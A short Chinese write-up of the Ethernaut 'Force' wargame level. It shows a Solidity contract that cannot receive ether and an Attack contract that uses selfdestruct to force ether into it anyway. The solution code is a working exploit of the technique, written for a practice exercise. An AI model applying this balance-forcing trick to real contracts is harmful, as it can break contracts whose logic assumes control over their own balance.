# Force

> 有些智能合约根本不会收你的钱 ¯\_(ツ)_/¯
> 
> 本次目标是让这个合约的余额大于0.

[link](https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B)


```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

很明显，这个卖萌的小猫正在狠狠嘲讽你的无能。

首先尝试一下直接用metamask给这个合约地址转账，显示转账失败。原因如下

> 如果既没有直接接收以太（receive函数），也没有可接收以太的 fallback 函数， 合约就不能通过常规交易接收以太，并抛出一个异常。

在这个时候，考虑使用selfdestruct把eth硬生生塞进去。

```sol
contract Attack {

    function attack(address addr_) external payable {
      selfdestruct(payable(addr_));
    }
}
```
